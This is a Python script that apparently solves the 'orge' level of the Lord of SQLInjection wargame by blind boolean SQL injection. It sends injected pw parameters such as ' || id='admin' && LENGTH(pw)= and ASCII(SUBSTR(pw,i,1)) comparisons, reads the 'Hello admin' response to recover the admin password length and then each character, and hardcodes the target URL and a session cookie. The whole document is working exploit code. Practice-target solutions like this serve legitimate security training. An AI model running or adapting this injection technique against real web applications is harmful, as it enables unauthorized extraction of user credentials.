import requests
import string

def lenth():
    lent = 0

    for i in range(1,100):
        param = "?pw=' || id='admin' %26%26 LENGTH(pw)=" + str(i) + "%23#"
        print("[+]pay : %s " % param)
        new_url = url + param
        r = requests.get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print("[+]pw's length : " + str(i))
            lent = i
            break

    return lent

def guess(leng):
    global pw
    for i in range(1,leng+1):
        print ("[+] i : %d" % i)
        for j in string:
            tmp = "?pw=a' || id='admin' %26%26 ASCII(SUBSTR(pw, " + str(i) + ", 1))=" + str(ord(j)) + "%23#"
            #tmp = "?pw=a' or id='admin' and ASCII(SUBSTR(pw, {}, 1))={}%23".join(str(i),str(ord(j) ))
            print ("[+]pay : %s " % tmp)
            u = url + tmp
            t = requests.get(u, cookies=cookies)
            if t.text.find("Hello admin") > 0:
                pw = pw + j
                print("[+] Pw : %s " % pw)
                break

if __name__== '__main__':
    url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"
    cookies = dict(PHPSESSID="i7a8fl56iv24kbpa9vuuk3nll7")
    string = abc = string.digits + string.ascii_letters
    pw = ''

    lena = lenth()
    guess(lena)
    print("[+] Pw : %s " % pw)